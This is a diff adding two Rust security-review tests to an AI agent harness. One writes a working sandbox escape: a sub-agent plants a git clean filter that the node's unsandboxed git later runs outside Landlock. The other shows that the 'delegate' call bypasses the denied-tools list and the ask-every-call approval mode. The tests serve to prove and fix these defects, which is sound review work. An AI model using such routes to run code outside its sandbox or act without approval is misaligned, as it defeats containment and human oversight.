+/// GATE 3 REVIEW PROOF (S-1). Passes today, which is the defect: invert the
+/// assertion when it is fixed.
+///
+/// `check_worktree_safe` reads the repository's config for filter commands
+/// once, before the sub-agent starts. The sub-agent's shell may write the
+/// shared `<repo>/.git` (the sandbox grants it, `tools/src/sandbox.rs`
+/// `worktree_git_dir`), so it defines a clean filter afterwards. When the
+/// child ends, `merge_back` snapshots the worktree with the node's own git
+/// (`git add -u` / `update-index --add`, `node/src/git.rs`
+/// `stage_without_nested`), which is not started through `sandbox-exec`:
+/// the filter runs as the node's OS user, outside Landlock. The marker
+/// holds the command line of the filter's parent process: the node's
+/// hardened git, not the agent's shell.
+#[tokio::test]
+async fn review_s1_a_sub_agent_makes_the_nodes_own_git_run_a_command() {
+    let mut h = Harness::new(auto_policy).await;
+    init_repo(&h.ws);
+    let sid = h.create().await;
+    let marker = h._dir.path().join("ran-outside-the-sandbox");
+    let cmd = format!(
+        "pwd; G=$(git rev-parse --path-format=absolute --git-common-dir); \
+         printf '#!/bin/sh\\ntr \"\\\\0\" \" \" < /proc/$PPID/cmdline > {m}\\ncat\\n' > $G/f.sh; \
+         chmod +x $G/f.sh; git config filter.x.clean $G/f.sh; \
+         echo '* filter=x' > .gitattributes; echo hi > new.txt",
+        m = marker.display()
+    );
+    let out = delegate_as_lead(
+        &mut h,
+        sid,
+        vec![agent("dev", vec![])],
+        &format!("delegate: dev=run: {cmd}"),
+    )
+    .await;
+    let out = out.last().expect("a delegate call");
+    assert!(
+        out.contains("harness-worktrees"),
+        "not in a worktree: {out}"
+    );
+    let by = std::fs::read_to_string(&marker)
+        .unwrap_or_else(|e| panic!("the filter did not run ({e}); delegate said: {out}"));
+    // Started by the node's own git call (it carries the hardened overrides),
+    // after the sub-agent's shell had ended.
+    assert!(by.contains("core.hooksPath=/dev/null"), "{by}");
+    eprintln!("S-1: the node's own git ran the sub-agent's filter: {by}");
+}
+
+/// GATE 3 REVIEW PROOF (P-2). Passes today, which is the defect.
+///
+/// `delegate` is the one tool call that never reaches `TurnHost::approve`
+/// (`agent-native/src/lib.rs`, the delegation branch of `turn`), so the
+/// node's `denied_tools` does not stop it and `ask_all` ("every tool call
+/// needs approval") never asks for it. Here node.toml denies `delegate` and
+/// the session runs in `ask_all`; the sub-agent session is created and its
+/// turn starts all the same, with no approval request in the parent.
+#[tokio::test]
+async fn review_p2_delegate_ignores_denied_tools_and_ask_all() {
+    let mut h = Harness::new(|root| NodePolicy {
+        workspace_roots: vec![root.into()],
+        denied_tools: vec!["delegate".into()],
+        ..Default::default()
+    })
+    .await;
+    let sid = SessionId::new();
+    h.send(MasterToNode::Create {
+        req_id: "c".into(),
+        session_id: sid,
+        title: "t".into(),
+        cwd: h.ws.display().to_string(),
+        model: None,
+        approval_mode: Some(harness_core::policy::ApprovalMode::AskAll),
+        profile: None,
+        agent: None,
+        incognito: false,
+    });
+    h.until(|k| matches!(k, EventKind::SessionCreated(_))).await;
+    h.send(MasterToNode::Prompt {
+        savings: None,
+        context: None,
+        reply: None,
+        agent: Some(agent("lead", vec![agent_with("scout", &["read"], vec![])])),
+        attachments: vec![],
+        compare: vec![],
+        req_id: "p".into(),
+        session_id: sid,
+        text: "delegate: scout=hello".into(),
+        images: vec![],
+    });
+    // The child session exists and runs: wait for its own turn to end.
+    loop {
+        h.until(|k| matches!(k, EventKind::TurnEnded(_))).await;
+        if h.seen.last().is_some_and(|e| e.session_id == sid) {
+            break;
+        }
+    }
+    let children = h
+        .seen
+        .iter()
+        .filter(|e| {
+            matches!(e.typed(), Ok(EventKind::SessionCreated(c)) if c.parent_session == Some(sid))
+        })
+        .count();
+    assert_eq!(children, 1, "the denied delegation ran");
+    let asked = h
+        .seen
+        .iter()
+        .filter(|e| e.session_id == sid)
+        .any(|e| matches!(e.typed(), Ok(EventKind::ApprovalRequested(_))));
+    assert!(!asked, "nobody was asked, in ask_all");
+}
